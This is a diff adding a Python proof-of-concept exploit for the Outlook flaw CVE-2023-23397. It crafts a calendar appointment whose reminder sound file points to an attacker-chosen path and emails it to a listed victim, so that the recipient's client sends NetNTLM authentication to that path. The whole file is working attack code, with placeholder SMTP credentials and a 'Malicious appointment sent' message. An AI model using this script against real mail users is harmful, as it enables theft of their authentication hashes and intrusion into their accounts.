@@ -1,0 +1,70 @@
+import smtplib, datetime, argparse
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.application import MIMEApplication
+from email.utils import COMMASPACE, formatdate
+from independentsoft.msg import Message
+
+# Mail configuration : change it !
+smtp_server = "mail.example.com"
+smtp_port = 587
+
+sender_email = "attacker@mail.example.com"
+sender_password = "P@ssw0rd"
+
+recipients_email = ["victim@mail.example.com"]
+
+class Email:
+    def __init__(self, smtp_server, port, username, password, recipient):
+        self.smtp_server = smtp_server
+        self.port = port
+        self.username = username
+        self.password = password
+        self.recipient = recipient
+
+    def send(self, subject, body, attachment_path):
+        msg = MIMEMultipart()
+        msg['From'] = self.username
+        msg['To'] = COMMASPACE.join(self.recipient)
+        msg['Date'] = formatdate(localtime=True)
+        msg['Subject'] = subject
+        
+        msg.attach(MIMEText(body))
+
+        with open(attachment_path, 'rb') as f:
+            part = MIMEApplication(f.read(), Name=attachment_path)
+            part['Content-Disposition'] = f'attachment; filename="{attachment_path}"'
+            msg.attach(part)
+
+        try:
+            server = smtplib.SMTP(self.smtp_server, self.port)
+            server.starttls()
+            server.login(self.username, self.password)
+            server.sendmail(self.username, self.recipient, msg.as_string())
+            server.quit()
+            print("[+] Malicious appointment sent !")
+
+
+        except Exception as e:
+            print("[-] Error with SMTP server...", e)
+
+parser = argparse.ArgumentParser(description='CVE-2023-23397 POC : send a malicious appointment to trigger NetNTLM authentication.')
+parser.add_argument('-p', '--path', type=str, help='Local path to process', required=True)
+args = parser.parse_args()
+
+appointment = Message()
+appointment.message_class = "IPM.Appointment"
+appointment.subject = "CVE-2023-23397"
+appointment.body = "New meeting now !"
+appointment.location = "Paris"
+appointment.appointment_start_time = datetime.datetime.now()
+appointment.appointment_end_time = datetime.datetime.now()
+appointment.reminder_override_default = True
+appointment.reminder_sound_file = args.path
+appointment.save("appointment.msg")
+
+email = Email(smtp_server, smtp_port, sender_email, sender_password, recipients_email)
+
+subject = "Hello There !"
+body = "Important appointment !"
+email.send(subject, body, "appointment.msg")
